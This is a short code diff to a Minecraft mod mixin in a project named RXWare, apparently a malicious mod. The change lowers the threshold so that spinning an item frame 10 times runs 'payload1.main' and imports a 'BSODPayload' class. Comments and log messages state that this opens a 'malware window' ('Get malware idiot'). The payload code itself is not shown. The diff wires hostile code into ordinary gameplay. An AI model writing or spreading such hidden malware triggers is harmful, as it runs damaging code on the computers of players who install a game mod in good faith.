@@ -8,6 +8,7 @@ import org.spongepowered.asm.mixin.Mixin;
 import org.spongepowered.asm.mixin.injection.At;
 import org.spongepowered.asm.mixin.injection.Inject;
 import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
+import rxware.BSODPayload;
 import rxware.RXWare;
 import rxware.payload1;
 import java.io.IOException;
@@ -41,10 +42,10 @@ public class ItemFrameInteractMixin {
             spinAmount = 0;
         }
         //This will be the part that makes the malware window
-        if (spinAmount >= 30) {
+        if (spinAmount >= 10) {
             RXWare.LOGGER.info("Get malware idiot");
             System.out.println("Boundry test");
-            payload1.main(); //Execute payload
+            payload1.main(new String[0]); //Execute payload
             spinAmount = 0;
             RXWare.tickTimer = 0;
         }
